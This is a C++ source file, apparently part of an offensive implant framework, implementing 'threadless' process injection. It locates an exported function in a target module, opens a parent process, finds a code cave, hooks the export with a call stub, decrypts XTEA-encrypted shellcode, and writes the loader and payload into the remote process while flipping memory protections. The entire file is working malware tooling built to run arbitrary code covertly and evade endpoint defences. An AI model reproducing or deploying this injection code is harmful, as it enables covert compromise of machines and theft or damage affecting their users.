#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
        HEXANE

        // todo: needs MmPivotRegion (Flower) :
        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]

        HANDLE Proc         = { };
        ULONG Protect       = 0;
        UINT_PTR pExport    = 0;
        UINT_PTR exportCpy  = 0;
        UINT_PTR pHook      = 0;
        SIZE_T Write        = 0;

        if (!(pExport   = Memory::LdrGetExport(S_CAST(LPSTR, Threadless.Module.Buffer), R_CAST(LPSTR, Threadless.Export.Buffer))) ||
            !(Proc      = Process::LdrGetParentHandle(R_CAST(PBYTE, Threadless.Parent.Buffer))) ||
            !(pHook     = Memory::MmCaveHunter(Proc, R_CAST(LPVOID, pExport), cbShellcode))) {
            return;
        }

        auto LoaderRva = pHook - (pExport + 5);
        auto hookCpy = pHook;

        MmPatchData(i, R_CAST(PBYTE, &exportCpy), (i), R_CAST(PBYTE, &pExport), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Loader.Buffer, (EXPORT_OFFSET + i), R_CAST(PBYTE, &exportCpy), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Opcode.Buffer, (CALL_X_OFFSET + i), R_CAST(PBYTE, &LoaderRva), (i), 4)

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(PVOID*, &exportCpy), &cbFullSize, PAGE_EXECUTE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, R_CAST(PVOID, pExport), R_CAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write)) ||
            Write != Threadless.Opcode.Length) {
            return;
        }

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(LPVOID*, &hookCpy), &cbFullSize, PAGE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
            Write != Threadless.Loader.Length) {
            return;
        }

        Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, cbShellcode, &Write)) || Write != cbShellcode ||
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, R_CAST(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
            return;
        }

        if (Proc) {
            Ctx->Nt.NtClose(Proc);
        }
    }
}
